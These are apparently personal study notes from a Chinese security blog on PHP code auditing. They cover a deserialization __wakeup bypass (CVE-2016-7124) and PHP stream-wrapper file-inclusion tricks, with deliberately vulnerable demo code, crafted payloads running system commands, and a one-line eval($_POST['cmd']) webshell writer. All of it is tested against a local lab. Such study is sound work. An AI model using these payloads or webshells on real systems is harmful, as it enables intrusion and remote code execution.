+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201208619.png" alt="image-20211025201208619"></p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201203470.png" alt="image-20211025201203470"></p>
+<h4 id="实例展示"><a href="#实例展示" class="headerlink" title="实例展示"></a>实例展示</h4><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>构造序列化字符串时，可以根据要进行序列化操作的类中的成员变量，写一份简易序列化函数，用于调试payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$target</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行拿到序列化字符串:</p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210307399.png" alt="image-20211025210307399"></p>
+<p>由于成员变量为protected模式，由此可知乱码为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改成员变量数目，绕过__wakeup()魔法函数，修改变量值长度与内容，添加恶意代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> O:1:&quot;A&quot;:1：&#123;s:9:&quot;%00*%00target&quot;;s:26:&quot;&lt;?php system(&#x27;whoami&#x27;); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210652227.png" alt="image-20211025210652227"></p>
+<h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h4><p>影响版本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span></span><br><span class="line">PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<p>当序列化对象进行反序列化时，如果表示对象属性个数的值大于真实的属性个数时，就会跳过_wakeup()的执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看此处代码可看出，当我们对类A进行反序列处理时，无论在$test处确立的target值为多少，unserialize()的前一刻都会触发A的__wakeup魔术方法，将序列化字符串中的target值处理为<code>wakeup</code>,最后调用析构函数____destruct()执行内部代码，将target值写入到文件之中，然后在php文件的结尾包含webshell.php之中进行执行。</p>
+<p>此处存在一处漏洞点，定义的序列化字符串属性个数大于真实的字符串属性个数时，__wakeup()魔法函数将不会生效:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">改:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;&#125;</span><br><span class="line">在序列化字符串中，只修改成员变量的值无效，还需修改其长度为对应长度大小。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025204112483.png" alt="image-20211025204112483"></p>
+<p>若类中成员变量为protected  、 private类型，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php序列化字符串在相应成员函数处如下所示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> 类型:在变量名前加上%<span class="number">00</span>*%<span class="number">00</span></span><br><span class="line">?file=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>类型:%<span class="number">00</span>类名%<span class="number">00</span>变量名</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00A%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025205746814.png" alt="image-20211025205746814"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-php代码审计学习-2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/" class="article-date">
+      <time datetime="2021-10-24T11:25:29.000Z" itemprop="datePublished">2021-10-24</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/">php代码审计学习(2)</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="PHP伪协议学习"><a href="#PHP伪协议学习" class="headerlink" title="PHP伪协议学习"></a>PHP伪协议学习</h3><p>参考自 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a>、 <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议实现命令执行的七种姿势</a>两篇文章进行复现学习。</p>
+<h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h4><ul>
+<li><strong>条件</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:off/on </span><br><span class="line">allow_url_include:off/on</span><br><span class="line"><span class="comment">#翻译一下就是file://协议的使用，不受这两个属性的开关的影响</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>作用</strong></li>
+</ul>
+<p>用于访问本地文件系统，在CTF中常用于<strong>读取本地文件</strong>且不受allow_url_fopen与allow_url_include的开关影响</p>
+<p>include()、require()、require_once()、include_once() 参数可控的情况下，如导入非php文件，则仍会按照php的语法进行解析。</p>
+<ul>
+<li>include()、include_once()下：这是由于包含的文件放到了<?php ?>之内，代码执行到包含处依旧被会视为php文件内容，出错只会产生警报，而不会停止运行。</li>
+<li>require()、require_once()下:是由于包含文件与原php文件拼接形成一个新的php文件，之后按照新php文件顺序进行执行。</li>
+</ul>
+<p><strong>说明：</strong></p>
+<p>file:// 文件是PHP使用的默认封装协议，可用于读取本地文件。当指定一个相对路径作为读取目录，其相对时基于当前工作目录的。在很多情况下时脚本所在的目录，除非被修改过。当使用CLI时某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
+<p><strong>用法：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:<span class="comment">///path/to/file.ext</span></span><br></pre></td></tr></table></figure>
+
+<p>举例展示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=./phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=file://D:\phpstudy_pro\WWW\phplearn\phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024195900350.png" alt="image-20211024195900350"></p>
+<h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h4><ul>
+<li>条件：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line">allow_url_include: 仅当php:<span class="comment">//input、php://memory、php://temp时需要on</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>作用：</li>
+</ul>
+<p><code>php:// </code>访问各个输入/输出流 。我们经常使用到的是<code>php://filter</code> 和<code>php://input</code> 用于<strong>读取源码</strong> ，php://input用于<strong>执行php代码</strong></p>
+<ul>
+<li>说明</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php://input</td>
+<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
+</tr>
+<tr>
+<td>php://output</td>
+<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php://fd</td>
+<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php://memory php://temp</td>
+<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>php://filter</strong> 参数</li>
+</ul>
+<p>该协议的参数会在该协议上进行传递，多个参数都可以在一个路径下传递，具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th>php://filter 参数</th>
+<th>描述</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+<td></td>
+</tr>
+<tr>
+<td>read=&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
+<td>*）分隔。</td>
+</tr>
+<tr>
+<td>write=&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
+<td>）分隔。</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>其中 read 与 write 处于同级路径上。</p>
+<ul>
+<li>可选的过滤器列表(4类)</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td>string.tolower</td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td>string.strip_tags</td>
+<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody></table>
+<p>其中最常用的便是convert.base64-encode 或 convert.base64-decode ，用于加解密完整读取文件</p>
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zlib.deflate &amp; zlib.inflate</td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td>bzip2.compress &amp; bzip2.decompress</td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mcrypt.*</td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td>mdecrypt.*</td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+<ul>
+<li>示例：</li>
+</ul>
+<ol>
+<li> <code>php://fileter/read=convert.base64-encode/resource=[文件名] </code>以base64加密的方式读取文件</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024202338746.png" alt="image-20211024202338746"></p>
+<p>​        2.<code>php://input</code> 执行php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行任意代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /phplearn/<span class="keyword">global</span>.php?file=php:<span class="comment">//input HTTP/1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">93.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">93.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 36</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/phplearn/global.php</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php eval(&#x27;system(&quot;ipconfig&quot;);&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024204509292.png" alt="image-20211024204509292"> </p>
+<p>写webshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;webshell.php&quot;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024205148007.png" alt="image-20211024205148007"></p>
+<h4 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h4><ul>
+<li>条件:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on;</span><br><span class="line">allow_url_include: off/on;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>作用:<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属压缩流，可以访问压缩文件中的子文件，更重要的是，他并不需要指定后缀名，可修改为任意后缀：<code>jpg png gix</code>等等。</li>
+<li>示例</li>
+</ul>
+<h5 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h5><p><code>zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名]</code></p>
+<p>压缩文件可以不为<strong>zip</strong>结尾</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phplearn/global.php?file=zip://D:\phpstudy_pro\WWW\phplearn\hello.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024211907449.png" alt="image-20211024211907449"></p>
+<h5 id="compress-zlib-file-gz"><a href="#compress-zlib-file-gz" class="headerlink" title="compress.zlib://file.gz"></a>compress.zlib://file.gz</h5><p>压缩phpinfo.txt为phpinfo.gz并上传(同样支持任意后缀名)</p>
+<p>compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025104109551.png" alt="image-20211025104109551"></p>
+<h5 id="compress-bzip2-file-bzq2"><a href="#compress-bzip2-file-bzq2" class="headerlink" title="compress.bzip2://file.bzq2"></a>compress.bzip2://file.bzq2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.bzip2://D:\phpstudy_pro\WWW\phplearn\hello.txt.bz2</span></span><br></pre></td></tr></table></figure>
+
+<p>此处我的电脑未能正常解析php文件。</p>
+<h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><ul>
+<li>条件</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on;</span><br><span class="line">allow_url_include:one;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>作用: 自<code>php&gt;=5.2.0</code>起，可以使用<code>data://</code> 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码</li>
+<li>语法:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br><span class="line">data:<span class="comment">//text/plain;base64,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>示例</li>
+</ul>
+<h5 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain"></a>data://text/plain</h5><p>若是GET传参，在bp中应注意空格转换为%20避免解析错误</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105240142.png" alt="image-20211025105240142"></strong></p>
+<h5 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data://text/plain;base64,"></a>data://text/plain;base64,</h5><p>将php代码转为base64形式，特殊字符转为url格式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105549575.png" alt="image-20211025105549575"></p>
+<h4 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp;https:// 协议"></a>http:// &amp;https:// 协议</h4><ul>
+<li>条件</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_fopen:on</span><br></pre></td></tr></table></figure>
+
